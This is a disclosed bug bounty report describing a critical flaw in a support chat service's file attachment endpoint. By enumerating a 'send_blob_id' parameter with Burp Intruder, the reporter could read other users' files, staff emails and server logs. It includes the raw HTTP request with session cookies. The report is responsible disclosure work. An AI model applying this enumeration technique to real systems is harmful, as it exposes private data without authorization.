# Local File Download

## Report Details
- **Report ID**: 345162
- **URL**: https://hackerone.com/reports/345162
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2018-04-30T19:54:48.684Z
- **Disclosed**: 2019-01-01T15:09:04.608Z

## Reporter
- **Username**: z0mb13
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ratelimited

## Vulnerability Information
**Summary:** This bug affects suuport.ratelimited.me and can be used by attackers to download local file from your servers including your emails, and files uploaded by your admins and other users.

**Description:** While starting a conversation with your support agent, I noticed an option to upload a file. And after it was being uploaded it was included with a "blob_id" parameter. it is vulnerable and is leading to download of all the files on your support server.

## Steps To Reproduce:

  * Follow the above steps as mentioned in description to get to the request mentioned below.]

```
GET /chat/send-attach/583-5PH467W8RA2NCWJ?__sid=583-5PH467W8RA2NCWJ&send_blob_id=485&_=1525115609706 HTTP/1.1
Host: support.ratelimited.me
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://support.ratelimited.me/widget/chat.html?dpsid=583-5PH467W8RA2NCWJ&parent_url=https%3A%2F%2Fsupport.ratelimited.me%2Fprofile
X-Requested-With: XMLHttpRequest
Cookie: __cfduid=debed713d869308c24159d6b0ce4df2481525076018; dpsid=583-5PH467W8RA2NCWJ; dpvc=11941-DH6W43CBT3WHJQN; __unam=c0d18f2-16315a5f2ac-ba1665a-242; __utma=138098738.1674211735.1525076589.1525107067.1525114365.3; __utmc=138098738; __utmz=138098738.1525076589.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); dpvut=X635APM2; dpchat_sid=583-5PH467W8RA2NCWJ; __utmb=138098738.29.10.1525114365; __utmt=1; dpchatid=51
Connection: close
```

  * After this I used a simple Intruder in the Burp suite to automate my requests to find out which blob_id numbers are giving a 200 Response. Attached a screenshot of the same.

  * I was able to read your personal emails and all the server logs, also all the files uploaded by others and admins. I was also able to join a ticket due to an email which leaked the joining link.
The irony is I was also able to read the email sent by Hackerone support to start this program :D

No harm has been done, you can remove the screenshots from here after you fix this bug.

## Supporting Material/References:

  * Have attached all the screenshots below which shows how harmful this could have been.

## Impact

All the files on the server are being leaked incuding personal emails and logs.

## Attachments
- Screen_Shot_2018-05-01_at_1.05.13_AM.png
- Screen_Shot_2018-05-01_at_1.02.43_AM.png
- Screen_Shot_2018-05-01_at_1.08.11_AM.png
- Screen_Shot_2018-05-01_at_1.08.02_AM.png
- Screen_Shot_2018-05-01_at_1.11.36_AM.png
- Screen_Shot_2018-05-01_at_1.10.04_AM.png
- Screen_Shot_2018-05-01_at_1.13.56_AM.png
- Screen_Shot_2018-05-01_at_1.15.32_AM.png
